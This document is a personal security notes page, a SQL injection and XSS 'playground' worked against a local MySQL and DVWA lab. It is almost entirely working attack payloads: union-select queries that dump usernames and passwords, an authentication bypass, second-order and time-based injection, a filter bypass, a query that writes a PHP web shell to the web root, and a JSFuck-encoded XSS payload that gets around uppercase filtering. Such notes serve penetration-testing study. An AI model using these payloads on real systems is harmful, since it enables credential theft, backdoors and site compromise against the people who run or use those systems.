---
description: This is my playground for SQL injection and XSS
---

# SQL Injection & XSS Playground

## Classic SQL Injection

### Union Select Data Extraction

```sql
mysql> select * from users where user_id = 1 order by 7;              
ERROR 1054 (42S22): Unknown column '7' in 'order clause'
mysql> select * from users where user_id = 1 order by 6;
mysql> select * from users where user_id = 1 union select 1,2,3,4,5,6;
```

![](<../../.gitbook/assets/Screenshot from 2018-11-17 15-59-39.png>)

```sql
select * from users where user_id = 1 union all select 1,(select group_concat(user,0x3a,password) from users),3,4,5,6;
```

![](<../../.gitbook/assets/Screenshot from 2018-11-17 16-03-00.png>)

### Authentication Bypass

```sql
mysql> select * from users where user='admin' and password='blah' or 1 # 5f4dcc3b5aa765d61d8327deb882cf99' 
```

![](<../../.gitbook/assets/Screenshot from 2018-11-17 16-16-06.png>)

### Second Order Injection

```sql
mysql> insert into accounts (username, password, mysignature) values ('admin','mynewpass',(select user())) # 'mynewsignature');
```

![](<../../.gitbook/assets/Screenshot from 2018-11-17 16-57-24.png>)

### Dropping a Backdoor

```sql
mysql> select * from users where user_id = 1 union select all 1,2,3,4,"<?php system($_REQUEST['c']);?>",6 into outfile "/var/www/dvwa/shell.php" #;
```

![](<../../.gitbook/assets/Screenshot from 2018-11-17 19-15-16.png>)

### Conditional Select

```sql
mysql> select * from users where user = (select concat((select if(1>0,'adm','b')),"in"));
```

![](<../../.gitbook/assets/Screenshot from 2018-11-18 21-39-53.png>)

### Bypassing Whitespace Filtering

```sql
mysql> select * from users where user_id = 1/**/union/**/select/**/all/**/1,2,3,4,5,6;
```

![](<../../.gitbook/assets/Screenshot from 2018-11-19 22-43-46.png>)

## Time Based SQL Injection

### Sleep Invokation

```sql
mysql> select * from users where user_id = 1 or (select sleep(1)+1);
```

![](<../../.gitbook/assets/Screenshot from 2018-11-17 15-51-50.png>)

```sql
select * from users where user_id = 1 union select 1,2,3,4,5,sleep(1);
```

![](<../../.gitbook/assets/Screenshot from 2018-11-17 15-53-52.png>)

```
```

## XSS

![](<../../.gitbook/assets/Peek 2018-11-17 20-17.gif>)

### Strtoupper Bypass

Say we have the following PHP code that takes `name` as a user supplied parameter:

```php
<?php
        $input=$_GET['name'];
        $sanitized=strtoupper(htmlspecialchars($input));   
        echo '<form action="">';
        echo "First name: <input type='text' name='name' value='".$sanitized."'><br>";
        echo "<input type='submit' value='Submit form'></form>";
        echo "</HTML></body>";
?>
```

Line 3 is vulnerable to XSS, and we can break out of the input with a single quote `'`:

```php
$sanitized=strtoupper(htmlspecialchars($input));   
```

For example, if we set the `name` parameter to the value of  `a'`, we get:

![](<../../.gitbook/assets/Screenshot from 2018-11-17 21-54-22.png>)

Note that the `a` got converted to a capital `A` and this is due to the `strtoupper` function being called on our input. What this means is that any ascii letters in our JavaScript payload will get converted to uppercase and become invalid and will not execute (i.e`alert() != ALERT()`).

To bypass this constraint, we can encode our payload using JsFuck, which eliminates all the letters from the payload and leaves us with this:

```php
A' onmouseover='[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()'
```

![](<../../.gitbook/assets/Screenshot from 2018-11-17 21-55-33.png>)

## References

{% embed url="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet" %}

{% embed url="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" %}

{% embed url="http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html" %}

{% embed url="https://www.youtube.com/watch?v=Rqt_BgG5YyI" %}
